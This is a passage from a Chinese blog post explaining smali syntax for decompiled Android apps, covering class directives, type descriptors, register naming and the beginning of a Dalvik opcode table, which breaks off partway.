  </entry>
  <entry>
    <title>smali语法</title>
    <url>/2023/03/17/2023-03-17-smali%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>突然意识到自己的 smali 语法其实还是有挺多的细节地方是不懂，特此开一篇博客更加详细的记录一下 smali 语法。</p>
<h3 id="smali"><a href="#smali" class="headerlink" title="smali"></a>smali</h3><p>smali ：一种介于 apk 和 java 源码之间的一种表示方式。使用 apktool 反编译 apk 后，会在反编译工程目录下生成一个 smali文件夹，一般而言，一个 smali 文件对应着一个类。</p>
<p>在 smali 代码中，声明语句一般都是以 <code>.</code> 开始。</p>
<h4 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h4><figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali"><span class="hljs-keyword">.class</span> &lt;访问权限&gt; [非权限修饰符] &lt;类名&gt;<br><span class="hljs-keyword">.super</span> &lt;父类名&gt;<br><span class="hljs-keyword">.source</span> &lt;源文件名&gt;<br><span class="hljs-keyword">.implements</span> &lt;接口名称&gt;<br></code></pre></td></tr></table></figure>

<ul>
<li>&lt;&gt;中的内容表示必不可缺的，[]表示的是可选择的。</li>
<li>访问权限修饰符即<code>public, protected, private, default</code>。</li>
<li>而非权限修饰符则指的是<code>final, abstract</code>。</li>
<li><code>L</code>表示类的完整签名，如<code>.super Ljava/lang/Object;</code> 表明是继承于 java/lang/Object 类。</li>
<li>经过混淆后，.source 可能为空。</li>
</ul>
<h4 id="类型对应"><a href="#类型对应" class="headerlink" title="类型对应"></a>类型对应</h4><p>dalvik 的字节码有两大类类型，原始类型和引用类型。引用类型是对象和数组，其他一切都是原始类型。</p>
<table>
<thead>
<tr>
<th>smali</th>
<th>java</th>
</tr>
</thead>
<tbody><tr>
<td>V</td>
<td>void - can only be used for return types</td>
</tr>
<tr>
<td>Z</td>
<td>boolean</td>
</tr>
<tr>
<td>B</td>
<td>byte (-128~127)</td>
</tr>
<tr>
<td>S</td>
<td>short</td>
</tr>
<tr>
<td>C</td>
<td>char</td>
</tr>
<tr>
<td>I</td>
<td>int</td>
</tr>
<tr>
<td>J</td>
<td>long (64 bits)</td>
</tr>
<tr>
<td>F</td>
<td>float</td>
</tr>
<tr>
<td>D</td>
<td>double (64 bits)</td>
</tr>
<tr>
<td>L</td>
<td>对象类型</td>
</tr>
<tr>
<td>[</td>
<td>array</td>
</tr>
</tbody></table>
<p>注：</p>
<ul>
<li>如果是int数组表示形式为 [I。</li>
<li>再比如数组类型 String[][]，在 smali 中表示形式为 [[Ljava/lang/String;</li>
</ul>
<h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><p>一个方法所申请的寄存器会分配给函数方法的参数 (parameter) 以及局部变量 (local variable) 。在 smali 中，一般有两种命名规则</p>
<ul>
<li>v 命名法</li>
<li>p 命名法</li>
</ul>
<p>假设方法申请了 m+n 个寄存器，其中局部变量占 m 个寄存器，参数占 n 个寄存器，对于不同的命名规则，其相应的命名如下：</p>
<table>
<thead>
<tr>
<th align="center">属性</th>
<th align="center">v命名法</th>
<th align="center">p命名法</th>
</tr>
</thead>
<tbody><tr>
<td align="center">局部变量</td>
<td align="center"><svg xmlns:xlink="http://www.w3.org/1999/xlink" width="15.471ex" height="2.009ex" style="vertical-align: -0.671ex;" viewbox="0 -576.1 6660.9 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">v_0,v_1,...,v_{m-1}</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-76" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"/>
<path stroke-width="1" id="E1-MJMAIN-30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/>
<path stroke-width="1" id="E1-MJMAIN-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/>
<path stroke-width="1" id="E1-MJMAIN-2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"/>
<path stroke-width="1" id="E1-MJMATHI-6D" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMAIN-2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-76" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-30" x="686" y="-213"/>
 <use xlink:href="#E1-MJMAIN-2C" x="939" y="0"/>
<g transform="translate(1384,0)">
 <use xlink:href="#E1-MJMATHI-76" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-31" x="686" y="-213"/>
</g>
 <use xlink:href="#E1-MJMAIN-2C" x="2323" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="2769" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="3214" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="3659" y="0"/>
 <use xlink:href="#E1-MJMAIN-2C" x="4104" y="0"/>
<g transform="translate(4549,0)">
 <use xlink:href="#E1-MJMATHI-76" x="0" y="0"/>
<g transform="translate(485,-150)">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-6D" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2212" x="878" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-31" x="1657" y="0"/>
</g>
</g>
</g>
</svg></td>
<td align="center"><svg xmlns:xlink="http://www.w3.org/1999/xlink" width="15.471ex" height="2.009ex" style="vertical-align: -0.671ex;" viewbox="0 -576.1 6660.9 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">v_0,v_1,...,v_{m-1}</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-76" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"/>
<path stroke-width="1" id="E1-MJMAIN-30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/>
<path stroke-width="1" id="E1-MJMAIN-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/>
<path stroke-width="1" id="E1-MJMAIN-2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"/>
<path stroke-width="1" id="E1-MJMATHI-6D" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMAIN-2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-76" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-30" x="686" y="-213"/>
 <use xlink:href="#E1-MJMAIN-2C" x="939" y="0"/>
<g transform="translate(1384,0)">
 <use xlink:href="#E1-MJMATHI-76" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-31" x="686" y="-213"/>
</g>
 <use xlink:href="#E1-MJMAIN-2C" x="2323" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="2769" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="3214" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="3659" y="0"/>
 <use xlink:href="#E1-MJMAIN-2C" x="4104" y="0"/>
<g transform="translate(4549,0)">
 <use xlink:href="#E1-MJMATHI-76" x="0" y="0"/>
<g transform="translate(485,-150)">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-6D" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2212" x="878" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-31" x="1657" y="0"/>
</g>
</g>
</g>
</svg></td>
</tr>
<tr>
<td align="center">函数参数</td>
<td align="center"><svg xmlns:xlink="http://www.w3.org/1999/xlink" width="25.905ex" height="2.509ex" style="vertical-align: -0.671ex;" viewbox="0 -791.3 11153.6 1080.4" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">v_m,v\_{m+1},...,v\_{m+n}</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-76" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"/>
<path stroke-width="1" id="E1-MJMATHI-6D" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/>
<path stroke-width="1" id="E1-MJMAIN-5F" d="M0 -62V-25H499V-62H0Z"/>
<path stroke-width="1" id="E1-MJMAIN-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/>
<path stroke-width="1" id="E1-MJMAIN-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/>
<path stroke-width="1" id="E1-MJMAIN-2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"/>
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-76" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-6D" x="686" y="-213"/>
 <use xlink:href="#E1-MJMAIN-2C" x="1206" y="0"/>
 <use xlink:href="#E1-MJMATHI-76" x="1651" y="0"/>
 <use xlink:href="#E1-MJMAIN-5F" x="2137" y="0"/>
<g transform="translate(2637,0)">
 <use xlink:href="#E1-MJMATHI-6D" x="0" y="0"/>
 <use xlink:href="#E1-MJMAIN-2B" x="1100" y="0"/>
 <use xlink:href="#E1-MJMAIN-31" x="2101" y="0"/>
</g>
 <use xlink:href="#E1-MJMAIN-2C" x="5239" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="5684" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="6130" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="6575" y="0"/>
 <use xlink:href="#E1-MJMAIN-2C" x="7020" y="0"/>
 <use xlink:href="#E1-MJMATHI-76" x="7465" y="0"/>
 <use xlink:href="#E1-MJMAIN-5F" x="7951" y="0"/>
<g transform="translate(8451,0)">
 <use xlink:href="#E1-MJMATHI-6D" x="0" y="0"/>
 <use xlink:href="#E1-MJMAIN-2B" x="1100" y="0"/>
 <use xlink:href="#E1-MJMATHI-6E" x="2101" y="0"/>
</g>
</g>
</svg></td>
<td align="center"><svg xmlns:xlink="http://www.w3.org/1999/xlink" width="15.229ex" height="2.009ex" style="vertical-align: -0.671ex; margin-left: -0.089ex;" viewbox="-38.5 -576.1 6556.8 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">p_0,p_1,...,p_{n-1}</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-70" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/>
<path stroke-width="1" id="E1-MJMAIN-30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/>
<path stroke-width="1" id="E1-MJMAIN-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/>
<path stroke-width="1" id="E1-MJMAIN-2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"/>
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMAIN-2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-70" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-30" x="712" y="-213"/>
 <use xlink:href="#E1-MJMAIN-2C" x="957" y="0"/>
<g transform="translate(1402,0)">
 <use xlink:href="#E1-MJMATHI-70" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-31" x="712" y="-213"/>
</g>
 <use xlink:href="#E1-MJMAIN-2C" x="2359" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="2805" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="3250" y="0"/>
 <use xlink:href="#E1-MJMAIN-2E" x="3695" y="0"/>
 <use xlink:href="#E1-MJMAIN-2C" x="4140" y="0"/>
<g transform="translate(4585,0)">
 <use xlink:href="#E1-MJMATHI-70" x="0" y="0"/>
<g transform="translate(503,-150)">
 <use transform="scale(0.707)" xlink:href="#E1-MJMATHI-6E" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2212" x="600" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-31" x="1379" y="0"/>
</g>
</g>
</g>
</svg></td>
</tr>
</tbody></table>
<p> 一般来说都是 p 命名法，因为其具有较好的可读性，可以方便地让我们知道寄存器属于哪一种类型。</p>
<p>需要注意的是：</p>
<ul>
<li>在非 static 方法中，p0 表示<code>this</code>，p1 表示第一个参数。</li>
<li>但是在 static 方法中，p0 表示第一个参数。</li>
</ul>
<h4 id="类方法声明"><a href="#类方法声明" class="headerlink" title="类方法声明"></a>类方法声明</h4><figure class="highlight oxygene"><table><tr><td class="code"><pre><code class="hljs oxygene">.method &lt;访问权限&gt; &lt;方法名&gt;(参数类型)&lt;返回值类型&gt;<br>	[.registers]   <span class="hljs-comment">// 寄存器个数=field个数+local个数</span><br>    [.prologue]    <span class="hljs-comment">// 指定代码开始位置</span><br>    [.param]       <span class="hljs-comment">// 指定方法参数</span><br>    [.line]        <span class="hljs-comment">// 指定代码在源代码中的行数，混淆后可能不存在</span><br>    [.locals]      <span class="hljs-comment">// 使用的局部变量个数</span><br>    &lt;代码体&gt;<br>.end <span class="hljs-function"><span class="hljs-keyword">method</span></span><br></code></pre></td></tr></table></figure>

<h4 id="smali-指令符"><a href="#smali-指令符" class="headerlink" title="smali 指令符"></a>smali 指令符</h4><p>底下的表是所有的 smali 语法的指令符号以及其的表示的含义及用法事例：</p>
<table>
<thead>
<tr>
<th>Opcode (hex)</th>
<th>Opcode name</th>
<th>Explanation</th>
<th>Example</th>
</tr>
</thead>
<tbody><tr>
<td>00</td>
<td>nop</td>
<td>无操作</td>
<td>0000 - nop</td>
</tr>
<tr>
<td>01</td>
<td>move vx, vy</td>
<td>将 vy 的值移入到 vx（4位，支持 int）</td>
<td>0110 - move v0, v1 Moves v1 into v0.</td>
</tr>
<tr>
<td>02</td>
<td>move/from16 vx, vy</td>
<td>Moves the content of vy into vx. vy may be in the 64k register range while vx is one of the first 256 registers.</td>
<td>0200 1900 - move/from16 v0, v25 Moves v25 into v0.</td>
</tr>
<tr>
<td>03</td>
<td>move/16</td>
<td></td>
<td></td>
</tr>
<tr>
<td>04</td>
<td>move-wide</td>
<td></td>
<td></td>
</tr>
<tr>
<td>05</td>
<td>move-wide/from16 vx, vy</td>
<td>Moves a long/double value from vy to vx. vy may be in the 64k register range while wx is one of the first 256 registers.</td>
<td>0516 0000 - move-wide/from16 v22, v0 Moves v0 into v22.</td>
</tr>
<tr>
<td>06</td>
<td>move-wide/16</td>
<td></td>
<td></td>
</tr>
<tr>
<td>07</td>
<td>move-object vx, vy</td>
<td>Moves the object reference from vy to vx.</td>
<td>0781 - move-object v1, v8 Moves the object reference in v8 to v1.</td>
</tr>
<tr>
<td>08</td>
<td>move-object/from16 vx,vy</td>
<td>Moves the object reference from vy to vx, vy can address 64k registers and vx can address 256 registers.</td>
<td>0801 1500 - move-object/from16 v1, v21 Move the object reference in v21 to v1.</td>
</tr>
<tr>
<td>09</td>
<td>move-object/16</td>
<td></td>
<td></td>
</tr>
<tr>
<td>0A</td>
<td>move-result vx</td>
<td>Move the result value of the previous method invocation into vx.</td>
<td>0A00 - move-result v0 Move the return value of a previous method invocation into v0.</td>
</tr>
<tr>
<td>0B</td>
<td>move-result-wide vx</td>
<td>Move the long/double result value of the previous method invocation into vx,vx+1.</td>
<td>0B02 - move-result-wide v2 Move the long/double result value of the previous method invocation into v2,v3.</td>
</tr>
<tr>
<td>0C</td>
<td>move-result-object vx</td>
<td>Move the result object reference of the previous method invocation into vx.</td>
<td>0C00 - move-result-object v0</td>
</tr>
<tr>
<td>0D</td>
<td>move-exception vx</td>
<td>Move the exception object reference thrown during a method invocation into vx.</td>
<td>0D19 - move-exception v25</td>
</tr>
<tr>
<td>0E</td>
<td>return-void</td>
<td>无返回值</td>
<td>0E00 - return-void</td>
</tr>
<tr>
<td>0F</td>
<td>return vx</td>
<td>将 vx 作为返回值返回</td>
<td>0F00 - return v0 Returns with return value in v0.</td>
</tr>
<tr>
<td>10</td>
<td>return-wide vx</td>
<td>Return with double/long result in vx,vx+1.</td>
<td>1000 - return-wide v0 Returns with a double/long value in v0,v1.</td>
</tr>
<tr>
<td>11</td>
<td>return-object vx</td>
<td>返回 vx 代表的实例化对象</td>
<td>1100 - return-object v0 Returns with object reference value in v0</td>
</tr>
<tr>
<td>12</td>
<td>const/4 vx, lit4</td>
<td>将 4 位常量值放入 vx</td>
<td>1221 - const/4 v1, #int2 Moves literal 2 into v1. The destination register is in the lower 4 bit in the second byte, the literal 2 is in the higher 4 bit.</td>
</tr>
<tr>
<td>13</td>
<td>const/16 vx, lit16</td>
<td>将 16 位常量值放入 vx</td>
<td>1300 0A00 - const/16 v0, #int 10 Puts the literal constant of 10 into v0.</td>
</tr>
<tr>
<td>14</td>
<td>const vx,  lit32</td>
<td>将 32 位常量值放入 vx</td>
<td>1400 4E61 BC00 - const v0, #12345678 // #00BC614E Moves literal 12345678 into v0.</td>
</tr>
<tr>
<td>15</td>
<td>const/high16 v0, lit16</td>
<td>Puts the 16 bit constant into the topmost bits of the register. Used to initialize float values.</td>
<td>1500 2041 - const/high16 v0, #float 10.0 // #41200000 Moves the floating literal of 10.0 into v0. The 16 bit literal in the instruction carries the top 16 bits of the floating point number.</td>
</tr>
<tr>
<td>16</td>
<td>const-wide/16 vx, lit16</td>
<td>Puts the integer constant into vx and vx+1 registers, expanding the integer constant into a long constant..</td>
<td>1600 0A00 - const-wide/16 v0, #long 10 Moves literal 10 into v0 and v1 registers.</td>
</tr>
<tr>
<td>17</td>
<td>const-wide/32 vx, lit32</td>
<td>Puts the 32 bit constant into vx and vx+1 registers, expanding the integer constant into a long constant.</td>
<td>1702 4e61 bc00 - const-wide/32 v2, #long 12345678 // #00bc614e Puts #12345678 into v2 and v3 registers.</td>
</tr>
<tr>
<td>18</td>
<td>const-wide vx, lit64</td>
<td>Puts the 64 bit constant into vx and vx+1 registers.</td>
<td>1802 874b 6b5d 54dc 2b00- const-wide v2, #long 12345678901234567 // #002bdc545d6b4b87 Puts #12345678901234567 into v2 and v3 registers.</td>
</tr>
<tr>
<td>19</td>
<td>const-wide/high16 vx,lit16</td>
<td>Puts the 16 bit constant into the highest 16 bit of vx and vx+1 registers. Used to initialize double values.</td>
<td>1900 2440 - const-wide/high16 v0, #double 10.0 // #402400000 Puts the double constant of 10.0 into v0 register.</td>
</tr>
<tr>
<td>1A</td>
<td>const-string vx,string_id</td>
<td>Puts reference to a string constant identified by string_id into vx.</td>
<td>1A08 0000 - const-string v8, “” // string@0000 Puts reference to string@0000 (entry #0 in the string table) into v8.</td>
</tr>
<tr>
<td>1B</td>
<td>const-string-jumbo</td>
<td></td>
<td></td>
</tr>
<tr>
<td>1C</td>
<td>const-class vx,type_id</td>
